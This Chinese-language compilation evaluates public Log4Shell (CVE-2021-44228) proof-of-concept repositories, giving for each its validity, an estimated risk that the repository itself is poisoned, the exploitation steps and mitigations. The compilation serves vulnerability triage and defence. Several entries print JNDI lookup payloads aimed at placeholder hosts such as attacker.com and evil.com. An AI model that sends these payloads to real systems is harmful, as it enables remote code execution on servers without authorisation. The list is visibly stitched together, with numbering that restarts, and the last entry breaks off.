* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

